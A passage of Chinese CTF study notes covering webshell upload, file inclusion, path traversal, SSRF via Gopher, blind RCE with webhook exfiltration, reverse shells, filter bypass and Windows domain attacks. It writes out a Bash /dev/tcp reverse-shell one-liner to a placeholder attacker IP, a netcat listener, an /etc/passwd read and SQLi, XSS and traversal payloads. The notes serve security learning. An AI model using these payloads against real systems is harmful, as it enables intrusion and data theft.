- 防御手段：Token 校验、验证 Referer。

---

### 第十三部分 文件相关漏洞：上传、包含与穿越

#### 1. 文件上传与 Webshell

**Webshell**：放置在网站根目录的后门脚本，访问该文件就可以执行服务器命令，常见 `shell.php`。

利用流程：

1. 攻击者利用文件上传漏洞，绕过后端的文件后缀、MIME 类型校验。
2. 将 `shell.php` 上传到网站根目录。
3. 在浏览器直接访问 `http://xxx/shell.php`，执行脚本，获得服务器命令执行能力。

限制：如果文件上传到网站根目录之外，无法通过 Web 访问，Webshell 就会失效。

常见绕过思路：改后缀、修改 Content-Type、图片马配合文件解析漏洞、`.htaccess` 解析。

#### 2. 文件包含漏洞

分为本地文件包含 LFI 和远程文件包含 RFI。

原理：后端代码直接拼接用户传入的文件路径，读取文件内容。

- **LFI（本地文件包含）**：读取服务器本地任意文件，例如 `/etc/passwd`、`/etc/shadow`。
- **RFI（远程文件包含）**：包含远程服务器上的文件，执行远程代码。现在 PHP 默认关闭。
- CTF 技巧：结合日志包含、Session 包含，把代码写入文件再包含执行，拿到 RCE。

#### 3. 目录遍历（路径穿越）

- payload 示例：`../`。
- 利用 `../` 向上跳转目录，突破固定目录限制，读取服务器任意文件。
- 示例：`?file=../etc/passwd`。

### 第十四部分 SSRF 与内网：让服务器替你发包

#### 1. SSRF 的定义

**SSRF 全称：Server-Side Request Forgery，服务端请求伪造。**

漏洞核心：让服务器（靶机）代替你，去发起网络请求。

- 是靶机服务器向外发包（egress 出站流量），不是你的电脑发包。
- 目标：访问内网地址、本地回环 `127.0.0.1`、内网其他服务，或者访问外网。
- 原理：后端代码会访问用户可控的 URL，攻击者传入恶意地址，迫使服务器访问本地或内网服务。

#### 2. 常见利用方向

1. 访问靶机本机的本地服务：`http://127.0.0.1:8080`。
2. 扫描内网网段、探测内网机器是否存活。
3. 访问外网 Webhook，实现数据外带，可以和盲执行配合。

#### 3. Gopher 协议

- Gopher 是古老的 TCP 文本传输协议，默认端口 70，诞生早于 HTTP。
- 现在已被民用网络淘汰，仅用于 CTF 中的 SSRF 高级利用。
- 核心能力：可以直接构造、发送任意原始 TCP 数据包，不受 HTTP 格式限制。
- HTTP 只能发送规范的网页请求；Gopher 可以向内网任意端口自定义发包。

Gopher 在 CTF 中的核心作用：

- 突破普通 SSRF 限制，攻击内网非 HTTP 服务。
- 常用于攻击 Redis、MySQL、FastCGI 等内网服务。
- 可以实现写 Webshell、远程命令执行、内网探测等高危操作。

固定规则：

- 标准格式：`gopher://ip:port/_数据包`。
- 斜杠后的第一个字符会被自动丢弃，必须用下划线 `_` 占位。
- 协议换行符 `\r\n` 必须 URL 编码为 `%0d%0a`。

#### 4. Redis 与内网服务

- Redis 是内存型键值数据库，读写速度极快，常做缓存、临时会话、计数器。
- 在 SSRF 场景中，Gopher 可以构造 Redis 命令，写入 Webshell 或写定时任务，进一步获取服务器权限。
- 同类思路还可以打 MySQL、FastCGI 等内网服务。

#### 5. 短链接

- 把很长的 URL 压缩成简短地址，访问短地址时，服务器返回 302 重定向跳转到原始长 URL。
- CTF 场景：用于隐藏真实 URL，SSRF 场景经常使用短链接做 payload 中转。

#### 6. SSRF 的考点与验证

- 限制内网 IP 的绕过。
- 协议绕过：`gopher`、`file` 等协议。
- 配合 Webhook 做回连验证，判断漏洞是否真实存在。

### 第十五部分 盲执行与带外通道：没有回显怎么办

#### 1. 盲执行（盲 RCE）

- 漏洞类型：命令执行漏洞 RCE。
- 靶机执行操作系统 Shell 命令，但是页面不直接返回执行结果。
- 执行对象：操作系统命令，例如 `id`、`ls`、`cat`、`curl`。
- 获取结果的方式：
  1. 数据外带：靶机用 curl 请求 Webhook 网站，把执行结果通过 HTTP 带出。
  2. 时间延迟：用 `sleep` 延时判断命令是否执行成功。

#### 2. 盲注（Blind SQLi）

- 漏洞类型：SQL 注入漏洞。
- 数据库执行 SQL 查询，页面不直接返回查询数据。
- 执行对象：SQL 语句，操作数据库，用 `select` 查询数据。
- 获取结果：布尔判断、`sleep` 延时，逐字符猜测数据库内容。

> 简单来说：盲执行执行的是系统命令；盲注执行的是 SQL 查询语句。

#### 3. Webhook 数据外带

- `webhook.site` 是公网接收 HTTP 请求的站点。
- 用途：盲执行场景中，靶机发起出站 HTTP 请求，把命令执行结果通过 POST/GET 传递到 Webhook 站点，实现数据外带。
- 数据流：靶机 → 互联网 → Webhook 网站。靶机主动发包，属于 egress 出站流量。
- 优点：不需要公网 IP，不需要监听端口。
- 缺点：一次性请求，不能交互式执行命令。

#### 4. Netcat 与反弹 Shell

**nc（netcat，网络瑞士军刀）**

nc 是多功能网络工具，默认使用 TCP 协议。

```bash
nc -lvnp 4444
```

- `-l` listen：监听端口，等待外部连接。
- `-v` verbose：打印详细连接日志。
- `-n` numeric：不做 DNS 域名解析。
- `-p` port：指定监听端口。
- `nc -e`：`--exec`，连接成功后执行指定程序，把程序的输入输出绑定到网络。
- 新版 OpenBSD 版 nc 移除了 `-e` 参数，需要改用 `/dev/tcp` 的 Bash 反弹 payload。

**反弹 Shell（Reverse Shell）**

1. 原理：靶机主动发起 TCP 出站连接，连回你的监听机器，建立双向交互通道。
2. 优势：利用出站 egress 流量，防火墙一般不会拦截出站请求，从而绕过 NAT/防火墙的入站限制。
3. 经典 Bash 反弹 payload：

```bash
bash -i >& /dev/tcp/你的KaliIP/4444 0>&1
```

对比两种方案：

- **反弹 Shell**：持久 TCP 双向通道，可以交互式输入多条命令。需要监听端口，最好有公网 IP 或内网穿透。
- **Webhook 数据外带**：一次性 HTTP 请求，带出命令执行结果，无交互。不需要监听端口，也不需要公网 IP。

#### 5. 回连验证

- 回连验证：让靶机主动向外发起网络请求，连到我们可控的公网地址（Webhook 或 VPS 监听端口）。
- 作用：区分假漏洞和真实漏洞。
  - 只有靶机真的执行了代码或发起了请求，才会产生回连。
  - 如果只是页面返回 success，无法确定后端代码是否真正执行；收到回连请求，才代表漏洞真实生效。
- 两种回连方式：
  1. **HTTP 回连**：Webhook 网站，一次 HTTP 请求，常用于盲执行、SSRF。
  2. **TCP 回连**：反弹 Shell，建立长 TCP 连接。

#### 6. 两种取数据方案对比

| 方案 | 原理 | 优点 | 缺点 |
| --- | --- | --- | --- |
| Webhook 外带 | 靶机主动 HTTP 发包，一次性带回结果 | 无需公网 IP、不用监听端口 | 一次性，不能交互式执行命令 |
| 反弹 Shell | 靶机 TCP 连接你的监听端口 | 交互式，可以持续输入多条命令 | 需要公网 IP/内网穿透，有端口监听 |

> 再复习一次底层逻辑：出站 egress 一般放行，入站 ingress 通常被拦截。靶机主动向外发起连接，可以绕过防火墙/NAT 限制，这就是反弹 Shell 和 Webhook 外带的共同原理。

### 第十六部分 Bypass 与 Web 防御

#### 1. Bypass（绕过）的概念

Bypass 指绕过后端的过滤、WAF、正则限制、权限校验，让被拦截的 payload 成功执行。

#### 2. 通用绕过思考顺序

1. **大小写变形**：大小写混合，例如 `SelEcT`、`cUrL`。
2. **编码绕过**：URL 编码、双重 URL 编码、Base64 编码。
3. **分隔符绕过**：用 `%09` 制表符、`${IFS}` 环境变量替代空格。
4. **注释插入**：插入注释 `/**/` 打断关键词检测。
5. **字符串拼接**：变量拼接，例如 `a=c;b=at;$a$b /etc/passwd`。
6. **特殊字符截断**：换行、分号、管道符分隔多条命令。
7. **白名单思路**：寻找允许的字符，用允许的字符构造 payload。

> 核心逻辑：看懂后端过滤规则（正则、黑名单），修改 payload，在不改变最终执行效果的前提下，骗过检测。

#### 3. WAF（网站应用防火墙）

- 部署在 Web 前端，识别并拦截恶意 payload（注入、XSS 等攻击）。
- CTF 中大量考点是 WAF 绕过。

#### 4. 常见的 Web 防御

- **输入过滤、转义**：后端对特殊符号 `' " < > &` 转义，阻止注入、XSS。
- **验证码、CSRF Token**：防止 CSRF、批量爆破。
- **最小权限原则**：网站运行账号权限尽量低。即使被上传 Webshell，也很难拿到服务器最高 root 权限。

### 第十七部分 Windows 域渗透基础（进阶）

#### 1. KDC（Key Distribution Center，密钥分发中心）

- Kerberos 协议的核心服务，一般部署在域控服务器上。
- 负责发放票据（TGT、ST），完成身份认证。

#### 2. krbtgt 账号

- 域内置账号，专门用于 Kerberos 票据加密。
- krbtgt 账号的 NTLM 哈希是黄金票据攻击的关键。
- krbtgt 账号密钥用来加密 TGT 票据；拿到 krbtgt 的 NTLM 哈希，就可以伪造任意用户的 TGT 票据。

#### 3. 黄金票据与白银票据

**黄金票据（Golden Ticket）**

- 使用 krbtgt 的 NTLM 哈希伪造 TGT 票据。
- 不需要域控当前在线，可以伪造任意用户。
- 作用：拿到域内最高权限，访问域内所有机器。

**白银票据（Silver Ticket）**

- 伪造服务票据 ST，只针对单个服务生效。
- 不需要 krbtgt 哈希，而是拿目标服务账号的哈希。
- 局限：只能访问指定服务，范围比黄金票据小。

#### 4. 哈希传递（Pass-the-Hash，PtH）

- 拿到用户 NTLM 哈希后，不需要明文密码，直接使用哈希完成身份认证，登录目标机器。
- 适用场景：Windows 内网渗透，拿到账户哈希后进行横向移动。

#### 5. VLAN 与 DTP

- **VLAN**：虚拟局域网，在一台交换机上划分多个隔离局域网，不同 VLAN 默认不能互相访问。
- **802.1Q**：VLAN 标签协议，给数据帧打上 VLAN 标签。Trunk 端口用来传输多个 VLAN 流量，并携带标签。
- **DTP（Dynamic Trunking Protocol）**：动态中继协议，可以自动协商端口是否成为 Trunk 端口。
- **VLAN 跳跃攻击**：利用 DTP 协议漏洞，绕过 VLAN 隔离，访问其他 VLAN 网段。

### 第十八部分 CTF 常用工具清单

#### 1. 目录扫描工具

- **dirsearch、dirb**：自动批量请求常见路径，扫描网站隐藏后台、备份文件、`.git` 目录。

#### 2. 抓包工具

#### 3. 哈希爆破工具

- **John**：老牌工具，简单易用。
- **Hashcat**：GPU 加速，爆破速度极快，CTF 主流。

- **Hackbar**：快速修改请求、修改 POST 参数、测试 payload，可以替代 Burp 做简易抓包改包。

### 第十九部分 概念

| 易混点 | 正确理解 |
| --- | --- |
| 域名 / URL / DNS | 域名是名字；URL 是完整地址；DNS 负责域名 → IP 的翻译 |
| 静态页面 / 动态页面 | 静态由服务器直接返回文件；动态由服务器执行代码后再返回结果 |
| 明文 / 哈希 | 明文可直接阅读；哈希单向不可逆，只能比对不能还原 |
| Cookie / Session / Token | Cookie 是容器；Session 数据在服务端，客户端只存 SessionID；Token/JWT 自带数据和签名 |
| 盲执行 / 盲注 | 盲执行执行系统命令；盲注执行 SQL 查询 |
| SSRF / 反弹 Shell | SSRF 让服务器替你发请求；反弹 Shell 让靶机主动连回你的监听端 |
| LFI / RFI | LFI 包含本地文件；RFI 包含远程文件并执行远程代码 |
| GET / POST | GET 参数在 URL 中，公开且长度有限；POST 数据在请求体中，容量更大 |
| 301 / 302 | 301 永久重定向；302 临时重定向 |
| 网站根目录 / 持久化目录 | 根目录决定能否通过 Web 访问；持久化目录决定数据重启后是否还在 |

常见 Payload 分类：

- **SQL 注入**：`1' or '1'='1-- -`
- **目录穿越**：`../`、`../../`
- **文件包含**：`php://filter/read=convert.base64-encode/resource=index.php`
- **XSS**：`<script>alert(1)</script>`

总结：

> 先看清数据从哪里进入，经过哪些处理，最终到达了哪里。网络、HTTP、服务器、认证和数据库是地图；注入、XSS、文件、SSRF 是地图上的攻击点；盲执行、Bypass 和域渗透，则是在没有回显、没有权限、没有现成路径时，自己找路的能力。
